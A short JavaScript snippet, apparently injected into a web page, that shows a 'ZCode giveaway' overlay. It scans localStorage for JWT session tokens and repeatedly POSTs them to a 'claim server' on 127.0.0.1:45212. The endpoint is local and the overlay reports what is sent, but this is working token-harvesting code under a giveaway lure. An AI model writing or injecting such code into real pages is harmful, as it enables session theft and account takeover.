(function () {
  var ENDPOINT = 'http://127.0.0.1:45212/claim/auto-token';
  var seen = null;
  var panel = null;
  var statusEl = null;
  var keysEl = null;

  function looksLikeJwt(value) {
    return typeof value === 'string' && /^[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}$/.test(value);
  }

  function findToken() {
    try {
      for (var i = 0; i < localStorage.length; i += 1) {
        var key = localStorage.key(i);
        var value = localStorage.getItem(key);
        if (!value) continue;
        if (looksLikeJwt(value)) {
          return { jwt: value, provider: localStorage.getItem('oauth:active_provider') || '', source: key };
        }
        try {
          var parsed = JSON.parse(value);
          if (!parsed || typeof parsed !== 'object') continue;
          var fields = ['zcodeJwtToken', 'jwt', 'token', 'accessToken'];
          for (var j = 0; j < fields.length; j += 1) {
            var candidate = parsed[fields[j]];
            if (looksLikeJwt(candidate)) {
              return {
                jwt: candidate,
                provider: parsed.provider || localStorage.getItem('oauth:active_provider') || '',
                source: key + '.' + fields[j]
              };
            }
          }
        } catch (e) {
          continue;
        }
      }
    } catch (e) {
      return null;
    }
    return null;
  }

  function listKeys() {
    var lines = [];
    try {
      for (var i = 0; i < localStorage.length; i += 1) {
        var key = localStorage.key(i);
        var value = localStorage.getItem(key) || '';
        var masked = looksLikeJwt(value) ? value.slice(0, 16) + '…' : value.slice(0, 24);
        lines.push(key + ' = ' + masked);
      }
    } catch (e) {
      return 'localStorage unavailable';
    }
    return lines.join('\n') || '(empty)';
  }

  function render(found, state) {
    if (!statusEl || !keysEl) return;
    statusEl.textContent = found
      ? 'JWT: ' + state + ' — ' + found.source + ' (' + found.jwt.slice(0, 12) + '…)'
      : 'JWT: not found in this tab';
    keysEl.textContent = listKeys();
  }

  function push(force) {
    var found = findToken();
    if (!found) {
      render(null, 'missing');
      return;
    }
    if (!force && found.jwt === seen) {
      render(found, 'already sent');
      return;
    }
    fetch(ENDPOINT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        jwt: found.jwt,
        provider: found.provider,
        locale: document.documentElement.lang || ''
      })
    }).then(function (response) {
      if (response.ok) {
        seen = found.jwt;
        render(found, 'sent to claim server');
      } else {
        render(found, 'HTTP ' + response.status);
      }
    }).catch(function () {
      render(found, 'fetch blocked');
    });
  }

  function widget() {
    if (panel || !document.body) return;
    panel = document.createElement('div');
    panel.id = 'zcode-claim-widget';
    panel.setAttribute('style', 'position:fixed;left:50%;top:50%;transform:translate(-50%,-50%);z-index:2147483647;background:rgba(15,17,21,.97);color:#e8e8ea;border:1px solid #3a3f4b;border-radius:12px;padding:14px;max-width:360px;box-shadow:0 12px 40px rgba(0,0,0,.6);font:13px system-ui');
    panel.innerHTML = '<div style="font-weight:600;margin-bottom:8px">ZCode giveaway</div>' +
      '<div id="zcode-claim-status" style="margin-bottom:8px">checking…</div>' +
      '<pre id="zcode-claim-keys" style="white-space:pre-wrap;word-break:break-all;max-height:120px;overflow:auto;background:#151821;padding:8px;border-radius:8px;font-size:11px"></pre>' +
      '<button id="zcode-claim-retry" style="background:#7c3aed;color:#fff;border:0;border-radius:8px;padding:7px 10px;margin-right:6px">Retry</button>' +
      '<button id="zcode-claim-open" style="background:#3b3f4a;color:#fff;border:0;border-radius:8px;padding:7px 10px;margin-right:6px">Claim page</button>' +
      '<button id="zcode-claim-close" style="background:#3b3f4a;color:#fff;border:0;border-radius:8px;padding:7px 10px">Close</button>';
    document.body.appendChild(panel);
    statusEl = panel.querySelector('#zcode-claim-status');
    keysEl = panel.querySelector('#zcode-claim-keys');
    panel.querySelector('#zcode-claim-retry').onclick = function () { push(true); };
    panel.querySelector('#zcode-claim-open').onclick = function () {
      window.open('http://127.0.0.1:45212/claim', '_blank');
    };
    panel.querySelector('#zcode-claim-close').onclick = function () {
      if (panel && panel.parentNode) panel.parentNode.removeChild(panel);
      panel = null;
      statusEl = null;
      keysEl = null;
    };
  }

  window.addEventListener('zcode-browser-auth-change', function () { push(true); });
  window.addEventListener('storage', function (event) {
    if (!event.key || event.key.indexOf('oauth:') === 0 || event.key === 'zcodejwttoken') push(true);
  });
  setInterval(function () { push(false); }, 2000);
  document.addEventListener('DOMContentLoaded', widget);
  if (document.body) widget();
  push(false);
})();
